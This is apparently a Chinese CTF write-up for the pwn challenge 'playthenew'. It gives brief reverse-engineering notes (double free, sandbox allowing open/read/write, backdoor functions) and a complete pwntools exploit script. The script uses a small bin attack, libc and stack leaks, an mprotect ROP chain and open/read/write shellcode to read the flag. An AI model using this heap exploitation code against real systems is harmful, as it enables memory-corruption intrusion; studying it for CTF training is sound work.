![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104731264-114b49cc-b311-4209-b669-3c06ad11847f.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104741181-ed2b1f58-2f45-441f-9cc6-b27d2b24b05d.png)

按快捷键c转为代码：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104759769-ed9d873f-cf11-4e34-942a-a814e3b663f5.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104772055-c750062a-b38f-4ce5-8412-ac2ae686bb0d.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104777389-40cbdb33-bd60-4c98-be69-142dc536d5a7.png)设置了alarm和沙箱

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104813571-c5aaea02-c212-4605-95d0-3f5855dc7f15.png)

白名单允许ORW

存在一个危险函数：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104916155-529bb601-e031-42b8-b110-d619dcab1fd2.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104950413-fdcef875-84da-448f-a145-32ada591935b.png)calloc不妨到tcache中

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104970170-277d69d5-d3fe-49fb-8407-b7c21f56fefb.png)double free

又是一个危险函数：
![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104999079-ba5bc982-0506-440a-b16f-22b46d2fdee5.png)

思路就是small bin attack修改值后使用两个危险函数

### 脚本

```python
#/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.arch = "amd64"
p = process('./playthenew')
# context.log_level = 'debug'
e = ELF('./playthenew')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def launch_gdb():
    os.system("gnome-terminal -- gdb -q ./playthenew " + str(proc.pidof(p)[0]))

def add(idx, size, name):
    p.sendlineafter('> ',str(1))
    p.sendlineafter('index:',str(idx))
    p.sendlineafter('ball:',str(size))
    p.sendafter('name:',name)

def delete(idx):
    p.sendlineafter('> ',str(2))
    p.sendlineafter('ball:',str(idx))

def show(idx):
    p.sendlineafter('> ',str(3))
    p.sendlineafter('ball:',str(idx))
    p.recvuntil('dance:')

def edit(idx, name):
    p.sendlineafter('> ',str(4))
    p.sendlineafter('ball:', str(idx))
    p.sendafter('ball:', name)

def secret(cnt):
    p.sendlineafter('> ',str(5))
    p.sendafter('place:', cnt)

def backdoor():
    p.sendlineafter('> ',str(0x666))

for _ in range(5):
    add(0,0x160,'a')
    delete(0)
add(0,0x88,'a')
delete(0)
add(0,0x88,'a')
delete(0)
show(0)
heap = u64(p.recvuntil(b'\n',drop=True).ljust(0x8,b'\x00'))-0x2a0 
log.info('h.address:'+hex(heap))
for _ in range(5):
    add(0,0x88,'a')
    delete(0)
add(0,0x88,'a')
add(1,0x88,'a')
delete(0)
show(0)
leak_libc = u64(p.recvuntil(b'\n',drop=True).ljust(0x8,b'\x00')) - 2014176
log.info('libc ' + hex(leak_libc))
# raw_input()
for _ in range(7):
    add(0,0xa0,'a')
    delete(0)
    add(1,0xb0,'a')
    delete(1)
    add(0,0xc0,'a')
    delete(0)
    add(1,0x90,'a')
    delete(1)
add(0,0xa0,'a')
add(1,0xb0,'a')
add(2,0xb0,'a')
add(2,0xa0,'a')
add(3,0xb0,'a')
add(4,0x90,'a')
add(4,0x90,'a')
delete(1)
delete(3)
add(1,0xc0,'a')
add(3,0xc0,'a')
delete(0)
delete(2)
delete(4)
delete(1)
add(3,0x200,'a')
edit(4,p64(heap + 7664) + p64(0x100000-0x10))
add(1,0x160,'a')
secret(p64(0) + p64(l.symbols['puts'] + leak_libc) + p64(l.symbols['environ'] + leak_libc))
backdoor()

leak_stack = u64(p.recvuntil(b'\n',drop=True).ljust(0x8,b'\x00'))
log.info('leak stack :' + hex(leak_stack)) # 288

shellcode = shellcraft.amd64.open('flag',0) + shellcraft.amd64.read('rax',0x100000,0x20) + \
    shellcraft.amd64.write(1,0x100000,0x20)

secret(p64(0) + p64(l.symbols['gets'] + leak_libc) + p64(leak_stack-288) + \
    b'\x90'*0x30 + asm(shellcode))
backdoor()
'''
0x0000000000026b72 : pop rdi ; ret
0x00000000001626d5 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000027529 : pop rsi ; ret
'''
rop = p64(0x00000000001626d5 + leak_libc) + p64(0) + p64(7) + p64(0)
rop += p64(0x0000000000026b72 + leak_libc) + p64(0x100000)
rop += p64(0x0000000000027529 + leak_libc) + p64(0x1000)
rop += p64(leak_libc + l.symbols['mprotect'])
rop += p64(0x100020)

p.sendline(rop)
p.interactive()
```